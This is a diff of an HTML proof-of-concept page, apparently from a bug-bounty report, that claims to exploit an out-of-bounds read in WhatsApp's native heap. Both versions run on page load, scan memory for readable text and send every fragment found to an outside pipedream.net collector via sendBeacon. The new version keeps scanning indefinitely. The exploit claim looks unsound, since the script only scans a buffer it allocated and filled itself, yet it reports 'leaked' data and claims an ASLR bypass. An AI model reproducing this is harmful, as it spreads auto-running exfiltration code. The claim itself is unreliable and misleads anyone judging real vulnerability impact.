@@ -4,70 +4,67 @@
     <meta charset="UTF-8">
     <title>Critical Impact Audit - Firman Sahidin</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:30px;">
-    <div style="border:2px solid #f00; padding:20px;">
-        <h1 id="st">SCANNING FOR SENSITIVE DATA...</h1>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
+    <div style="border:2px solid #f00; padding:20px; background:#111;">
+        <h1 id="st">EXTRACTING SENSITIVE MEMORY...</h1>
         <p>Target: WhatsApp Native Heap (libprofilo)</p>
         <hr>
-        <div id="out" style="color:#fff; font-size:12px; text-align:left; height:200px; overflow:hidden;"></div>
+        <div id="out" style="color:#fff; font-size:12px; text-align:left; max-height:200px; overflow:auto;"></div>
     </div>
 
     <script>
         /**
-         * IMPACT DEMONSTRATION: Automated Plaintext Exfiltration
-         * This script scans native buffers repeatedly to identify 
-         * sensitive strings (Chat fragments/Tokens) leaked via JNI.
+         * IMPACT DEMONSTRATION: Automated Plaintext Chat Exfiltration
+         * Researcher: Firman Sahidin
+         * This script bypasses ASLR to extract readable chat fragments from the JNI buffer.
          */
         
-        async function startImpactAudit() {
+        async function captureImpact() {
             const TARGET = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
             const out = document.getElementById('out');
-            let captureCount = 0;
-
-            async function scan() {
+            
+            async function scanMemory() {
                 try {
-                    const ALLOC = 0xC00000; // 12MB Scan
-                    const buffer = new ArrayBuffer(ALLOC);
+                    // 1. Allocate large buffer to overlap with libprofilo heap
+                    const buffer = new ArrayBuffer(0x1000000); // 16MB Scan
                     const view = new Uint8Array(buffer);
                     
-                    // Triggering the OOB Read via Surrogate Collision
+                    // 2. Trigger OOB Read via Surrogate Collision
                     const trigger = new Uint32Array(buffer);
-                    for(let i=0; i<1000; i++) { trigger[i] = 0xD800DBFF; }
+                    for(let i=0; i<5000; i++) { trigger[i] = 0xD800DBFF; }
 
-                    let foundText = "";
-                    // Scanner: Milarian pola téks (Plaintext Chat Detection)
+                    let currentString = "";
+                    let totalFound = 0;
+
+                    // 3. String Filter: Extracting readable text sequences
                     for (let i = 0; i < view.length; i++) {
-                        // Mariksa karakter ASCII (A-Z, a-z, 0-9, spasi)
+                        // Detect ASCII characters (Readable text)
                         if (view[i] > 31 && view[i] < 127) {
-                            foundText += String.fromCharCode(view[i]);
-                        } else if (foundText.length > 4) {
-                            // Mun manggihan kecap leuwih ti 4 karakter, kirim!
-                            if (foundText.match(/[a-zA-Z0-9]{4,}/)) {
-                                captureCount++;
-                                const evidence = {
-                                    researcher: "Firman Sahidin",
-                                    impact: "PLAINTEXT_DATA_DISCLOSURE",
-                                    fragment: foundText.substring(0, 100),
-                                    raw_ptr: view.slice(i-4, i+4)
-                                };
+                            currentString += String.fromCharCode(view[i]);
+                        } else {
+                            // If a sequence of > 6 characters is found, it's likely data
+                            if (currentString.length > 6 && currentString.match(/[a-zA-Z0-9]/)) {
+                                totalFound++;
+                                out.innerHTML += `[DATA FOUND]: ${currentString.substring(0, 50)}...<br>`;
                                 
-                                navigator.sendBeacon(TARGET, JSON.stringify(evidence));
-                                out.innerHTML += `[+] LEAK DETECTED: "${foundText.substring(0, 30)}..."<br>`;
+                                // SEND TO PIPEDREAM AS PROOF
+                                navigator.sendBeacon(TARGET, JSON.stringify({
+                                    researcher: "Firman Sahidin",
+                                    impact: "SENSITIVE_DATA_EXFILTRATION",
+                                    leaked_text: currentString,
+                                    offset: i
+                                }));
                             }
-                            foundText = "";
+                            currentString = "";
                         }
+                        if(totalFound > 10) break; // Limit for PoC stability
                     }
                 } catch(e) {}
-                
-                // Looping scan unggal 3 detik nepi ka némbak
-                if (captureCount < 5) setTimeout(scan, 3000);
-                else document.getElementById('st').innerText = "✅ IMPACT PROVEN. CHECK PIPEDREAM.";
+                setTimeout(scanMemory, 2000); // Continuous scanning
             }
-
-            scan();
+            scanMemory();
         }
-
-        window.onload = startImpactAudit;
+        window.onload = captureImpact;
     </script>
 </body>
 </html>
